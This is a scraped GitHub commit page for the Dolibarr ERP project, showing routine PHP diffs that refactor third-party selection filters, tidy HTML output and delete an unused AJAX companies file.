|  |  |  |
|  |  | // Clone confirmation |
|  |  | if ($action == 'clone') { |
|  |  | $filter = '(s.client=1 OR s.client=2 OR s.client=3)'; |
|  |  | // Create an array for form |
|  |  | $formquestion = array( |
|  |  | array('type' => 'other', 'name' => 'socid', 'label' => $langs->trans("SelectThirdParty"), 'value' => $form->select\_company($object->socid, 'socid', '(s.client=1 OR s.client=2 OR s.client=3)', 1)), |
|  |  | array('type' => 'other', 'name' => 'socid', 'label' => $langs->trans("SelectThirdParty"), 'value' => $form->select\_company($object->socid, 'socid', $filter, 1)), |
|  |  | array('type' => 'date', 'name' => 'newdate', 'label' => $langs->trans("Date"), 'value' => dol\_now()) |
|  |  | ); |
|  |  | // Request confirmation to clone |
| Expand Down | |  |

16 changes: 7 additions & 9 deletions

16
[htdocs/compta/facture/stats/index.php](#diff-251ea383ee2ca6f1b04a72a6279e15dc7e64acac5bcb13d4c62172a2e7310e07 "htdocs/compta/facture/stats/index.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb/htdocs/compta/facture/stats/index.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -265,15 +265,6 @@ |
|  |  |  |
|  |  | print dol\_get\_fiche\_head($head, 'byyear', $langs->trans("Statistics"), -1); |
|  |  |  |
|  |  | // We use select\_thirdparty\_list instead of select\_company so we can use $filter and share same code for customer and supplier. |
|  |  | $filter = ''; |
|  |  | if ($mode == 'customer') { |
|  |  | $filter = 's.client in (1,2,3)'; |
|  |  | } |
|  |  | if ($mode == 'supplier') { |
|  |  | $filter = 's.fournisseur = 1'; |
|  |  | } |
|  |  |  |
|  |  | print '<div class="fichecenter"><div class="fichethirdleft">'; |
|  |  |  |
|  |  |  |
| Expand All | | @@ -286,6 +277,13 @@ |
|  |  | print '<tr class="liste\_titre"><td class="liste\_titre" colspan="2">'.$langs->trans("Filter").'</td></tr>'; |
|  |  | // Company |
|  |  | print '<tr><td>'.$langs->trans("ThirdParty").'</td><td>'; |
|  |  | $filter = ''; |
|  |  | if ($mode == 'customer') { |
|  |  | $filter = 's.client in (1,2,3)'; |
|  |  | } |
|  |  | if ($mode == 'supplier') { |
|  |  | $filter = 's.fournisseur = 1'; |
|  |  | } |
|  |  | print img\_picto('', 'company', 'class="pictofixedwidth"'); |
|  |  | print $form->select\_company($socid, 'socid', $filter, 1, 0, 0, array(), 0, 'widthcentpercentminusx maxwidth300'); |
|  |  | print '</td></tr>'; |
| Expand Down | |  |

7 changes: 2 additions & 5 deletions

7
[htdocs/compta/stats/cabyprodserv.php](#diff-eb5b783cac54270af53c7d2f4b1041b9dab9f80b8ba15a6af1daa98eeb3c0361 "htdocs/compta/stats/cabyprodserv.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb/htdocs/compta/stats/cabyprodserv.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -418,12 +418,9 @@ |
|  |  |  |
|  |  | print '<td colspan="5" class="right">'; |
|  |  | print '<input type="image" class="liste\_titre" name="button\_search" src="'.img\_picto($langs->trans("Search"), 'search.png', '', '', 1).'" value="'.dol\_escape\_htmltag($langs->trans("Search")).'" title="'.dol\_escape\_htmltag($langs->trans("Search")).'">'; |
|  |  | print '</td>'; |
|  |  |  |
|  |  | $parameters = array(); |
|  |  | $reshook = $hookmanager->executeHooks('printFieldListeTitle', $parameters); |
|  |  | print $hookmanager->resPrint; |
|  |  |  |
|  |  | print '</td></tr>'; |
|  |  | print '</tr>'; |
|  |  |  |
|  |  | // Array header |
|  |  | print "<tr class=\"liste\_titre\">"; |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[htdocs/compta/stats/supplier\_turnover\_by\_prodserv.php](#diff-ea89742fdfeffdffb5555eaaedd818ed260a6a2be858af77f3f0c914eb31f166 "htdocs/compta/stats/supplier_turnover_by_prodserv.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb/htdocs/compta/stats/supplier_turnover_by_prodserv.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -377,7 +377,7 @@ |
|  |  | print '</td></tr>'; |
|  |  |  |
|  |  | // Array header |
|  |  | print "<tr class=\"liste\_titre\">"; |
|  |  | print '<tr class="liste\_titre">'; |
|  |  | print\_liste\_field\_titre( |
|  |  | $langs->trans("Product"), |
|  |  | $\_SERVER["PHP\_SELF"], |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[htdocs/contact/card.php](#diff-7307a45028dca98060cd867efe4dff3948c1ccbcda82f4350ecbf45f9317e715 "htdocs/contact/card.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb/htdocs/contact/card.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -996,7 +996,7 @@ |
|  |  | if (empty($conf->global->SOCIETE\_DISABLE\_CONTACTS)) { |
|  |  | print '<tr><td><label for="socid">'.$langs->trans("ThirdParty").'</label></td>'; |
|  |  | print '<td colspan="3" class="maxwidthonsmartphone">'; |
|  |  | print img\_picto('', 'company').$form->select\_company(GETPOST('socid', 'int') ?GETPOST('socid', 'int') : ($object->socid ? $object->socid : -1), 'socid', '', $langs->trans("SelectThirdParty")); |
|  |  | print img\_picto('', 'company').$form->select\_company(GETPOST('socid', 'int') ? GETPOST('socid', 'int') : ($object->socid ? $object->socid : -1), 'socid', '', $langs->trans("SelectThirdParty")); |
|  |  | print '</td>'; |
|  |  | print '</tr>'; |
|  |  | } |
| Expand Down | |  |

3 changes: 2 additions & 1 deletion

3
[htdocs/contrat/card.php](#diff-b36b235b2eb1cbfba445b9f143a513acfaafd2819bece067f5f5bafb9f5c6ed4 "htdocs/contrat/card.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/3065b9ca6ade988e8d7a8a8550415c0abb56b9cb/htdocs/contrat/card.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -1332,8 +1332,9 @@ |
|  |  | ); |
|  |  | $formconfirm = $form->formconfirm($\_SERVER['PHP\_SELF']."?id=".$object->id, $langs->trans("ActivateAllOnContract"), $langs->trans("ConfirmActivateAllOnContract"), "confirm\_activate", $formquestion, 'yes', 1, 280); |
|  |  | } elseif ($action == 'clone') { |
|  |  | $filter = '(s.client=1 OR s.client=2 OR s.client=3)'; |
|  |  | // Clone confirmation |
|  |  | $formquestion = array(array('type' => 'other', 'name' => 'socid', 'label' => $langs->trans("SelectThirdParty"), 'value' => $form->select\_company(GETPOST('socid', 'int'), 'socid', '(s.client=1 OR s.client=2 OR s.client=3)'))); |
|  |  | $formquestion = array(array('type' => 'other', 'name' => 'socid', 'label' => $langs->trans("SelectThirdParty"), 'value' => $form->select\_company(GETPOST('socid', 'int'), 'socid', $filter))); |
|  |  | $formconfirm = $form->formconfirm($\_SERVER["PHP\_SELF"].'?id='.$object->id, $langs->trans('ToClone'), $langs->trans('ConfirmCloneContract', $object->ref), 'confirm\_clone', $formquestion, 'yes', 1); |
|  |  | } |
|  |  |  |
| Expand Down | |  |

135 changes: 0 additions & 135 deletions

135
[htdocs/core/ajax/ajaxcompanies.php](#diff-7d68365a708c954051853ade884c7e97c6ff13150ee92657d6ffc8603e0f947b "htdocs/core/ajax/ajaxcompanies.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/263d315ba4e06f37340b9c3649c3c1a32a7f03c0/htdocs/core/ajax/ajaxcompanies.php)
Edit file

Delete file

Load diff

This file was deleted.

Oops, something went wrong.

Retry

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `3065b9c`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FDolibarr%2Fdolibarr%2Fcommit%2F3065b9ca6ade988e8d7a8a8550415c0abb56b9cb) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


